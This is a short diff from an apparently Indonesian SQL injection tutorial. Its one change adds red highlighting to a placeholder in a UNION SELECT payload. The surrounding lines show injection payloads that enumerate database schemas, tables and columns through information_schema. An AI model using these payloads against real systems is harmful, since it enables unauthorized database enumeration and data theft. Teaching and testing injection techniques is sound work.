@@ -41,7 +41,7 @@ union select table_schema,1,2 from information_schema.tables;
 
    ###### Format :
    ```
-   union select column_name,1,2  FROM information_schema.columns WHERE `TABLE_SCHEMA`='nama database' AND `TABLE_NAME`='nama tabel';
+   union select column_name,1,2  FROM information_schema.columns WHERE `TABLE_SCHEMA`='<span style="color:red;">nama database</span>' AND `TABLE_NAME`='nama tabel';
    ```
    ###### Contoh :
    ```
